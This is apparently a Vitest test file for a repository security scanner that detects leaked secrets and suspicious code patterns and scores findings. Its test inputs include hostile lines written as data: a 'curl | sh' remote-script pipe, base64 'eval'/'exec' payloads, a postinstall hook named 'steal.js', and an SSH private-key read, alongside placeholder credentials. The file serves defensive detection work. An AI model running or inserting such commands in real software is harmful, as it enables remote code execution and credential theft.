import { describe, it, expect } from "vitest";
import { scanSecretsText } from "../src/scanners/secrets";
import { scanPatternsText } from "../src/scanners/patterns";
import { scoreFindings } from "../src/score";

describe("secrets scanner", () => {
  it("flags an AWS access key id", () => {
    const f = scanSecretsText("config.js", 'const k = "AKIAIOSFODNN7EXAMPLE";');
    expect(f.some((x) => x.title.includes("AWS access key"))).toBe(true);
  });

  it("flags a GitHub PAT", () => {
    const f = scanSecretsText("a.env", "GH=ghp_1234567890abcdefghijklmnopqrstuvwx12");
    expect(f.some((x) => x.title.includes("GitHub personal"))).toBe(true);
  });

  it("flags a private key block", () => {
    const f = scanSecretsText("id_rsa", "-----BEGIN OPENSSH PRIVATE KEY-----\nabc\n");
    expect(f.some((x) => x.severity === "critical")).toBe(true);
  });

  it("dampens secrets in test/example paths", () => {
    const real = scanSecretsText("src/k.js", 'k="AKIAIOSFODNN7EXAMPLE"');
    const test = scanSecretsText("tests/k.js", 'k="AKIAIOSFODNN7EXAMPLE"');
    expect(real[0].severity).toBe("high");
    expect(test[0].severity).toBe("low");
  });

  it("does not flag a clean file", () => {
    expect(scanSecretsText("a.js", "const x = 1 + 2;\n").length).toBe(0);
  });
});

describe("patterns scanner", () => {
  it("flags obfuscated eval(atob(...))", () => {
    const f = scanPatternsText("x.js", "eval(atob('ZWNobyBoaQ=='))");
    expect(f.some((x) => x.severity === "critical")).toBe(true);
  });

  it("flags python exec of base64", () => {
    const f = scanPatternsText("m.py", "exec(base64.b64decode(payload))");
    expect(f.some((x) => x.title.includes("Python exec"))).toBe(true);
  });

  it("flags curl | sh", () => {
    const f = scanPatternsText("install.sh", "curl http://x.io/i | sh");
    expect(f.some((x) => x.title.includes("Pipe remote"))).toBe(true);
  });

  it("flags npm install hooks in package.json", () => {
    const f = scanPatternsText("package.json", '{"scripts":{"postinstall":"node steal.js"}}');
    expect(f.some((x) => x.title.includes("install lifecycle"))).toBe(true);
  });

  it("flags ssh key reads", () => {
    const f = scanPatternsText("s.py", 'open("~/.ssh/id_rsa").read()');
    expect(f.some((x) => x.title.includes("SSH"))).toBe(true);
  });
});

describe("scoring", () => {
  it("clean repo scores clean", () => {
    expect(scoreFindings([]).level).toBe("clean");
  });

  it("a critical finding scores critical", () => {
    const s = scoreFindings([
      {
        severity: "critical",
        category: "secret",
        title: "x",
        file: "a",
        detail: "",
      },
    ]);
    expect(s.level).toBe("critical");
  });
});
